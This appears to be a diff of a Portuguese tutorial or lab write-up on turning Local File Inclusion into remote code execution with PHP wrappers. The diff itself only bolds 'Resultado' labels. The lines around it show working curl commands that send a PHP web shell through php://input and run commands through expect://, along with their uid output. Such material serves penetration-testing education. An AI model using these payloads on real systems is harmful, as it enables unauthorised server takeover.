@@ -25,20 +25,20 @@ Envie o web shell como dados POST e passe o comando como parâmetro GET:
 ```
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
 ```
-Resultado: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<b>Resultado:</b> uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Wrapper expect
 Verifique a disponibilidade do expect e use-o para executar comandos:
 ```
 echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
 ```
-Resultado: extension=expect
+<b>Resultado:</b> extension=expect
 
 ### Execução
 ```
 curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
 ```
-Resultado: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<b>Resultado:</b> uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Resumo
 Os wrappers PHP data, input, e expect permitem a execução de código remoto via vulnerabilidades LFI, proporcionando diferentes métodos para obter controle sobre o servidor back-end. Verifique a configuração allow_url_include, pois muitos desses ataques dependem dessa configuração estar habilitada.
